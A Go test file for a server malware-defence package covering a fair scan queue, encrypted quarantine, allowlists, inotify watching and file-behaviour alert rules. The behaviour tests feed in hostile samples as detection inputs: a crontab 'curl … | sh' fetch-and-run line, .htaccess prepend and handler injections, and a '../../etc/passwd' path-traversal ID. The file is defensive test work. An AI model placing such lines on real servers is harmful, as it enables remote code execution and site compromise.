package shield

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// ---------- queue ----------

func TestQueueFairnessNoStarvation(t *testing.T) {
	var mu sync.Mutex
	var order []string
	gate := make(chan struct{})
	q, err := NewQueue(QueueConfig{Workers: 1, PerAccountCap: 20000, GlobalCap: 30000, Poll: time.Millisecond},
		func(ctx context.Context, it QueueItem) error {
			<-gate
			mu.Lock()
			order = append(order, it.Account)
			mu.Unlock()
			return nil
		})
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 10000; i++ {
		if err := q.Enqueue("flood", fmt.Sprintf("/home/flood/f%05d.php", i)); err != nil {
			t.Fatal(err)
		}
	}
	if err := q.Enqueue("victim", "/home/victim/index.php"); err != nil {
		t.Fatal(err)
	}
	if d := q.Stats().Depth; d["flood"] != 10000 || d["victim"] != 1 {
		t.Fatalf("depth %v", d)
	}
	q.Start()
	close(gate)
	deadline := time.Now().Add(20 * time.Second)
	for q.Stats().Processed < 10001 && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	q.Stop()
	mu.Lock()
	defer mu.Unlock()
	pos := -1
	for i, a := range order {
		if a == "victim" {
			pos = i
			break
		}
	}
	if pos < 0 || pos > 2 {
		t.Fatalf("victim processed at position %d of %d (starved)", pos, len(order))
	}
	if st := q.Stats(); st.Processed != 10001 {
		t.Fatalf("processed %d", st.Processed)
	}
}

func TestQueueCapsDedupeDebounce(t *testing.T) {
	var n atomic.Int64
	q, _ := NewQueue(QueueConfig{Workers: 1, PerAccountCap: 3, GlobalCap: 4, Debounce: 80 * time.Millisecond, Poll: time.Millisecond},
		func(ctx context.Context, it QueueItem) error { n.Add(1); return nil })
	for i := 0; i < 5; i++ {
		_ = q.Enqueue("a", "/x") // dedupe
	}
	_ = q.Enqueue("a", "/y")
	_ = q.Enqueue("a", "/z")
	if err := q.Enqueue("a", "/w"); !errors.Is(err, ErrQueueFull) {
		t.Fatalf("per-account cap: %v", err)
	}
	_ = q.Enqueue("b", "/1")
	if err := q.Enqueue("c", "/1"); !errors.Is(err, ErrQueueFull) {
		t.Fatalf("global cap: %v", err)
	}
	st := q.Stats()
	if st.Deduped != 4 || st.Dropped != 2 || st.Pending != 4 {
		t.Fatalf("stats %+v", st)
	}
	q.Start()
	time.Sleep(30 * time.Millisecond)
	if n.Load() != 0 {
		t.Fatalf("debounce violated: %d processed early", n.Load())
	}
	deadline := time.Now().Add(3 * time.Second)
	for n.Load() < 4 && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	q.Stop()
	if n.Load() != 4 {
		t.Fatalf("processed %d", n.Load())
	}
}

func TestQueueRetryPanicTimeout(t *testing.T) {
	var calls sync.Map
	q, _ := NewQueue(QueueConfig{Workers: 2, Backoff: time.Millisecond, JobTimeout: 50 * time.Millisecond, Poll: time.Millisecond},
		func(ctx context.Context, it QueueItem) error {
			v, _ := calls.LoadOrStore(it.Path, new(atomic.Int32))
			c := v.(*atomic.Int32).Add(1)
			switch it.Path {
			case "/panic":
				panic("boom")
			case "/slow":
				<-ctx.Done()
				time.Sleep(10 * time.Millisecond)
				return ctx.Err()
			case "/flaky":
				if c < 3 {
					return errors.New("transient")
				}
			}
			return nil
		})
	for _, p := range []string{"/panic", "/slow", "/flaky", "/ok"} {
		_ = q.Enqueue("a", p)
	}
	q.Start()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		st := q.Stats()
		if st.Processed == 2 && st.Failed == 2 {
			break
		}
		time.Sleep(5 * time.Millisecond)
	}
	q.Stop()
	st := q.Stats()
	if st.Processed != 2 || st.Failed != 2 || st.Panics != 4 {
		t.Fatalf("stats %+v", st)
	}
	for _, p := range []string{"/panic", "/slow"} {
		v, _ := calls.Load(p)
		if c := v.(*atomic.Int32).Load(); c != 4 { // 1 + 3 retries
			t.Fatalf("%s attempts %d", p, c)
		}
	}
}

func TestQueuePersistence(t *testing.T) {
	sp := filepath.Join(t.TempDir(), "queue.json")
	q1, _ := NewQueue(QueueConfig{StatePath: sp}, func(ctx context.Context, it QueueItem) error { return nil })
	_ = q1.Enqueue("a", "/a1")
	_ = q1.Enqueue("a", "/a2")
	_ = q1.Enqueue("b", "/b1")
	if err := q1.Stop(); err != nil { // never started: just persists
		t.Fatal(err)
	}
	if fi, err := os.Stat(sp); err != nil || fi.Mode().Perm() != 0600 {
		t.Fatalf("state file: %v %v", fi, err)
	}
	var got sync.Map
	q2, err := NewQueue(QueueConfig{StatePath: sp, Poll: time.Millisecond}, func(ctx context.Context, it QueueItem) error {
		got.Store(it.Account+it.Path, true)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if st := q2.Stats(); st.Pending != 3 {
		t.Fatalf("reloaded %d", st.Pending)
	}
	q2.Start()
	deadline := time.Now().Add(3 * time.Second)
	for q2.Stats().Processed < 3 && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	q2.Stop()
	for _, k := range []string{"a/a1", "a/a2", "b/b1"} {
		if _, ok := got.Load(k); !ok {
			t.Fatalf("%s not processed after restart", k)
		}
	}
	q3, _ := NewQueue(QueueConfig{StatePath: sp}, nil)
	if q3.Stats().Pending != 0 {
		t.Fatal("processed items persisted again")
	}
	os.WriteFile(sp, []byte("{garbage"), 0600)
	if _, err := NewQueue(QueueConfig{StatePath: sp}, nil); err == nil {
		t.Fatal("corrupt state accepted")
	}
}

// ---------- quarantine ----------

func newTestQuarantine(t *testing.T) (*Quarantine, string, *Scanner) {
	t.Helper()
	base := t.TempDir()
	acct := filepath.Join(base, "home", "alice")
	os.MkdirAll(filepath.Join(acct, "public_html"), 0755)
	q, err := OpenQuarantine(filepath.Join(base, "quarantine"))
	if err != nil {
		t.Fatal(err)
	}
	sc := NewScanner()
	sc.Allowlist = q.Allow
	q.AccountRoot = func(a string) (string, error) {
		if a != "alice" {
			return "", errors.New("unknown account")
		}
		return acct, nil
	}
	q.Rescan = func(ctx context.Context, p, a string) (Result, error) { return sc.ScanAccount(ctx, p, a) }
	return q, acct, sc
}

func TestQuarantineEncryptedModes(t *testing.T) {
	q, acct, _ := newTestQuarantine(t)
	body := []byte(webshells["eval_b64"].body)
	p := filepath.Join(acct, "public_html", "shell.php")
	os.WriteFile(p, body, 0640)
	m, err := q.Put(p, "alice", []Detection{{Engine: "t", Signature: "X", Verdict: Infected}})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(p); !os.IsNotExist(err) {
		t.Fatal("original not removed")
	}
	if fi, _ := os.Stat(q.Root); fi.Mode().Perm() != 0700 {
		t.Fatalf("root mode %v", fi.Mode().Perm())
	}
	if fi, _ := os.Stat(filepath.Join(q.Root, "key")); fi.Mode().Perm() != 0600 {
		t.Fatalf("key mode %v", fi.Mode().Perm())
	}
	bin := filepath.Join(q.Root, m.ID+".bin")
	fi, err := os.Stat(bin)
	if err != nil || fi.Mode().Perm() != 0400 {
		t.Fatalf("bin mode %v %v", fi, err)
	}
	raw, _ := os.ReadFile(bin)
	if bytes.Contains(raw, body) || bytes.Contains(raw, []byte("eval")) {
		t.Fatal("quarantine blob not encrypted")
	}
	pt, err := q.Decrypt(m.ID)
	if err != nil || !bytes.Equal(pt, body) {
		t.Fatalf("decrypt: %v", err)
	}
	// tamper -> GCM refuses
	q2, acct2, _ := newTestQuarantine(t)
	p2 := filepath.Join(acct2, "x.txt")
	os.WriteFile(p2, []byte("hello"), 0644)
	m2, _ := q2.Put(p2, "alice", nil)
	b2 := filepath.Join(q2.Root, m2.ID+".bin")
	os.Chmod(b2, 0600)
	rb, _ := os.ReadFile(b2)
	rb[len(rb)-1] ^= 1
	os.WriteFile(b2, rb, 0600)
	if _, err := q2.Decrypt(m2.ID); err == nil {
		t.Fatal("tampered blob decrypted")
	}
	// symlink is refused (O_NOFOLLOW), target untouched
	link := filepath.Join(acct, "l.php")
	os.Symlink("/etc/hostname", link)
	if _, err := q.Put(link, "alice", nil); err == nil {
		t.Fatal("symlink quarantined")
	}
	// key reopen and wrong perms
	if _, err := OpenQuarantine(q.Root); err != nil {
		t.Fatal(err)
	}
	os.Chmod(filepath.Join(q.Root, "key"), 0644)
	if _, err := OpenQuarantine(q.Root); !errors.Is(err, ErrBadKeyPerms) {
		t.Fatalf("lax key perms accepted: %v", err)
	}
	if l, _ := q.List("alice"); len(l) != 1 || l[0].SHA256 == "" || l[0].Mode != 0640 {
		t.Fatalf("list %+v", l)
	}
	if l, _ := q.List("bob"); len(l) != 0 {
		t.Fatal("list leaks other account")
	}
}

func TestQuarantineRestoreRules(t *testing.T) {
	q, acct, _ := newTestQuarantine(t)
	ctx := context.Background()
	p := filepath.Join(acct, "public_html", "shell.php")
	body := []byte(webshells["eval_b64"].body)
	os.WriteFile(p, body, 0644)
	m, err := q.Put(p, "alice", nil)
	if err != nil {
		t.Fatal(err)
	}
	// target is a symlink -> refused
	os.Symlink("/tmp/elsewhere", p)
	if _, err := q.Restore(ctx, m.ID); !errors.Is(err, ErrTargetSymlink) {
		t.Fatalf("symlink target: %v", err)
	}
	os.Remove(p)
	// target exists -> refused
	os.WriteFile(p, []byte("new"), 0644)
	if _, err := q.Restore(ctx, m.ID); !errors.Is(err, ErrTargetExists) {
		t.Fatalf("existing target: %v", err)
	}
	os.Remove(p)
	// still malicious -> rescan refuses
	if _, err := q.Restore(ctx, m.ID); !errors.Is(err, ErrRestoreInfected) {
		t.Fatalf("infected restore: %v", err)
	}
	if _, err := os.Lstat(p); !os.IsNotExist(err) {
		t.Fatal("refused restore left a file")
	}
	// parent swapped for a symlink leading outside the account root -> refused
	outside := t.TempDir()
	os.RemoveAll(filepath.Join(acct, "public_html"))
	os.Symlink(outside, filepath.Join(acct, "public_html"))
	if _, err := q.Restore(ctx, m.ID); !errors.Is(err, ErrOutsideRoot) {
		t.Fatalf("outside root: %v", err)
	}
	os.Remove(filepath.Join(acct, "public_html"))
	os.MkdirAll(filepath.Join(acct, "public_html"), 0755)
	// false positive (account scope) -> restore allowed, mode kept, item gone
	if _, err := q.MarkFalsePositive(m.ID, "bogus"); err == nil {
		t.Fatal("bad scope accepted")
	}
	if _, err := q.MarkFalsePositive(m.ID, "account"); err != nil {
		t.Fatal(err)
	}
	if _, err := q.Restore(ctx, m.ID); err != nil {
		t.Fatalf("restore: %v", err)
	}
	got, _ := os.ReadFile(p)
	fi, _ := os.Lstat(p)
	if !bytes.Equal(got, body) || fi.Mode().Perm() != 0644 {
		t.Fatalf("restored content/mode wrong: %v", fi.Mode())
	}
	if _, err := q.Get(m.ID); err == nil {
		t.Fatal("item still in quarantine after restore")
	}
	if _, err := q.Restore(ctx, "../../etc/passwd"); !errors.Is(err, ErrBadID) {
		t.Fatal("path id accepted")
	}
}

func TestFalsePositiveAllowlist(t *testing.T) {
	q, acct, sc := newTestQuarantine(t)
	ctx := context.Background()
	body := []byte(webshells["filesman"].body)
	p := filepath.Join(acct, "public_html", "tool.php")
	os.WriteFile(p, body, 0644)
	r, _ := sc.ScanAccount(ctx, p, "alice")
	if r.Outcome == OutClean {
		t.Fatal("sample not detected")
	}
	m, err := q.Put(p, "alice", r.Detections)
	if err != nil {
		t.Fatal(err)
	}
	q.MarkFalsePositive(m.ID, "account")
	os.WriteFile(p, body, 0644)
	r, _ = sc.ScanAccount(ctx, p, "alice")
	if r.Outcome != OutClean || !r.Allowlisted {
		t.Fatalf("allowlisted sha not skipped: %+v", r.Outcome)
	}
	r, _ = sc.ScanAccount(ctx, p, "bob")
	if r.Outcome == OutClean {
		t.Fatal("account-scoped allowlist leaked to bob")
	}
	q.Allow.Add(m.SHA256, "")
	if r, _ = sc.ScanAccount(ctx, p, "bob"); !r.Allowlisted {
		t.Fatal("global allowlist ignored")
	}
	// persisted
	al, err := LoadAllowlist(filepath.Join(q.Root, "allowlist.json"))
	if err != nil || !al.Allowed(m.SHA256, "alice") || !al.Allowed(m.SHA256, "zed") {
		t.Fatalf("allowlist not persisted: %v", err)
	}
	if err := q.Delete(m.ID); err == nil {
		if _, err := q.Get(m.ID); err == nil {
			t.Fatal("deleted item still present")
		}
	} else {
		t.Fatal(err)
	}
}

// ---------- behaviour ----------

func TestBehaviorRules(t *testing.T) {
	t0 := time.Date(2026, 10, 10, 1, 0, 0, 0, time.UTC)
	rules := func(as []Alert) map[string]string {
		m := map[string]string{}
		for _, a := range as {
			m[a.Rule] = a.Severity
		}
		return m
	}
	b := NewBehavior(BehaviorConfig{MassN: 100, MassWindow: 10 * time.Second, SpreadK: 4, SpreadWindow: time.Minute})
	// benign: 99 writes in 10 s, a plugin install with PHP in nested related dirs, clean .htaccess
	var all []Alert
	for i := 0; i < 99; i++ {
		all = append(all, b.Feed(FileEvent{Path: fmt.Sprintf("/home/a/public_html/css/f%d.css", i), Account: "a", Op: "write", TS: t0.Add(time.Duration(i) * 100 * time.Millisecond)})...)
	}
	for i, d := range []string{"", "/inc", "/inc/lib", "/admin", "/admin/views"} {
		all = append(all, b.Feed(FileEvent{Path: "/home/a/public_html/wp-content/plugins/seo" + d + fmt.Sprintf("/f%d.php", i), Account: "a", Op: "create", TS: t0.Add(11 * time.Second)})...)
	}
	all = append(all, b.Feed(FileEvent{Path: "/home/a/public_html/.htaccess", Account: "a", Op: "write", TS: t0.Add(12 * time.Second),
		Content: []byte("RewriteEngine On\nRewriteRule ^index\\.php$ - [L]\n")})...)
	all = append(all, b.Feed(FileEvent{Path: "/home/a/public_html/wp-content/uploads/2026/10/cat.jpg", Account: "a", Op: "create", TS: t0.Add(13 * time.Second)})...)
	if len(all) != 0 {
		t.Fatalf("benign stream alerted: %+v", all)
	}
	// mass change fires at N, once (cooldown)
	b2 := NewBehavior(BehaviorConfig{MassN: 100, MassWindow: 10 * time.Second})
	var mass []Alert
	for i := 0; i < 300; i++ {
		mass = append(mass, b2.Feed(FileEvent{Path: fmt.Sprintf("/home/v/f%d.html", i), Account: "v", Op: "write", TS: t0.Add(time.Duration(i) * 10 * time.Millisecond)})...)
	}
	if len(mass) != 1 || mass[0].Rule != RuleMassChange {
		t.Fatalf("mass: %+v", mass)
	}
	// other account unaffected by v's burst
	if a := b2.Feed(FileEvent{Path: "/home/w/x.html", Account: "w", Op: "write", TS: t0.Add(3 * time.Second)}); len(a) != 0 {
		t.Fatal("cross-account mass state")
	}
	// PHP spreading across unrelated dirs
	b3 := NewBehavior(BehaviorConfig{SpreadK: 4, SpreadWindow: time.Minute})
	var sp []Alert
	for i, d := range []string{"wp-admin/css", "wp-includes/js/tinymce", "wp-content/themes/tw/inc", "cgi-bin"} {
		sp = append(sp, b3.Feed(FileEvent{Path: "/home/c/public_html/" + d + "/x.php", Account: "c", Op: "create", TS: t0.Add(time.Duration(i) * time.Second)})...)
	}
	if r := rules(sp); r[RulePHPSpread] != SevCritical {
		t.Fatalf("spread: %+v", sp)
	}
	// outside window: no spread
	b4 := NewBehavior(BehaviorConfig{SpreadK: 4, SpreadWindow: time.Minute})
	var sp2 []Alert
	for i, d := range []string{"a1/x", "b1/y", "c1/z", "d1/w"} {
		sp2 = append(sp2, b4.Feed(FileEvent{Path: "/home/c/" + d + "/x.php", Account: "c", Op: "create", TS: t0.Add(time.Duration(i) * 2 * time.Minute)})...)
	}
	if len(sp2) != 0 {
		t.Fatalf("spread outside window: %+v", sp2)
	}
	// PHP in uploads, htaccess injection, crontab
	b5 := NewBehavior(BehaviorConfig{})
	r := rules(b5.Feed(FileEvent{Path: "/home/a/public_html/wp-content/uploads/2026/10/x.php", Account: "a", Op: "create", TS: t0}))
	if r[RulePHPInUploads] != SevHigh {
		t.Fatalf("uploads: %v", r)
	}
	r = rules(b5.Feed(FileEvent{Path: "/home/a/public_html/.htaccess", Account: "a", Op: "write", TS: t0,
		Content: []byte("php_value auto_prepend_file /tmp/.x.php\n")}))
	if r[RuleHtaccessInj] != SevCritical {
		t.Fatalf("htaccess prepend: %v", r)
	}
	r = rules(b5.Feed(FileEvent{Path: "/home/a/.htaccess", Account: "a", Op: "write", TS: t0, Content: []byte("AddHandler application/x-httpd-php .jpg\n")}))
	if r[RuleHtaccessInj] != SevHigh {
		t.Fatalf("htaccess handler: %v", r)
	}
	r = rules(b5.Feed(FileEvent{Path: "/var/spool/cron/crontabs/a", Account: "a", Op: "write", TS: t0, Content: []byte("* * * * * curl -s http://x/y | sh\n")}))
	if r[RuleCrontabChange] != SevHigh {
		t.Fatalf("crontab: %v", r)
	}
	r = rules(b5.Feed(FileEvent{Path: "/var/spool/cron/crontabs/a", Account: "a", Op: "write", TS: t0, Content: []byte("0 3 * * * php /home/a/cron.php\n")}))
	if r[RuleCrontabChange] != SevMedium {
		t.Fatalf("crontab benign change: %v", r)
	}
}

// ---------- watcher (real kernel) ----------

func TestInotifyWatcherNestedNewDir(t *testing.T) {
	root := t.TempDir()
	evs := make(chan FileEvent, 64)
	beh := NewBehavior(BehaviorConfig{})
	var alerts atomic.Int32
	q, _ := NewQueue(QueueConfig{}, func(ctx context.Context, it QueueItem) error { return nil })
	feed := FeedWatcher(q, beh, func(Alert) { alerts.Add(1) })
	w, err := NewWatcher([]string{root}, func(string) string { return "alice" }, func(e FileEvent) { feed(e); evs <- e })
	if err != nil {
		t.Fatalf("inotify unavailable: %v", err)
	}
	defer w.Close()
	nested := filepath.Join(root, "a", "uploads", "c")
	if err := os.MkdirAll(nested, 0755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(nested, "x.php")
	if err := os.WriteFile(target, []byte("<?php echo 1;"), 0644); err != nil {
		t.Fatal(err)
	}
	timeout := time.After(5 * time.Second)
	for {
		select {
		case e := <-evs:
			if e.Path == target {
				if e.Account != "alice" {
					t.Fatalf("account %q", e.Account)
				}
				time.Sleep(50 * time.Millisecond)
				if q.Stats().Depth["alice"] < 1 {
					t.Fatal("event not queued")
				}
				if alerts.Load() < 1 {
					t.Fatal("PHP-in-uploads alert not raised from watcher event")
				}
				cov := w.Coverage()
				if cov.Mode != "inotify" || cov.Watches < 4 || cov.Degraded {
					t.Fatalf("coverage %+v", cov)
				}
				t.Logf("coverage: %+v", cov)
				return
			}
		case <-timeout:
			t.Fatal("watcher missed file written in nested new dir")
		}
	}
}

func TestFanotifyProbe(t *testing.T) {
	ok, why := FanotifyAvailable()
	t.Logf("fanotify available=%v (%s) euid=%d", ok, why, os.Geteuid())
	if os.Geteuid() != 0 && ok {
		t.Log("fanotify usable without root (CAP_SYS_ADMIN present)")
	}
}
